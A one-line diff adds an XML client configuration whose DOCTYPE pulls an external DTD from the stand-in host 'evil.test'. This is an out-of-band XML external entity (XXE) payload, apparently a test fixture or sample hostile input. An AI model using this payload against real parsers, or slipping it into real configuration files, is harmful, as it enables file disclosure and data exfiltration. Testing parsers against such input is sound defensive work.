@@ -1,0 +1,1 @@
+<!DOCTYPE c [<!ENTITY % p SYSTEM "http://evil.test/x.dtd"> %p;]><clientConfig/>
